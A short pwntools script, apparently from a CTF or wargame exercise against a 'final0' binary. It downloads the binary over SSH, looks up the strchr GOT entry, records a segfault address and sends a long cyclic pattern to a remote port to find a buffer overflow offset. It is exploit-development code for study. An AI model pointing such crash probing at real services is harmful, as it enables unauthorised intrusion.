from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))
lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
gotstrchr_addr = e.symbols['got.strchr']
log.info('gotstrchr_addr: %08x', gotstrchr_addr)
s.close()

# [ 1040.470029] final0[1755]: segfault at 6861616f ip b7f02910 sp bffff98c error 4 in libc-2.11.2.so[b7e97000+13e000]

log.info(p32(0x6861616f))


#payload = cyclic(0x210-1)
with remote(args.HOST, int(args.PORT)) as c:
    payload = cyclic(0x300)
    #c.interactive()
    c.sendline(payload)
    c.recv()
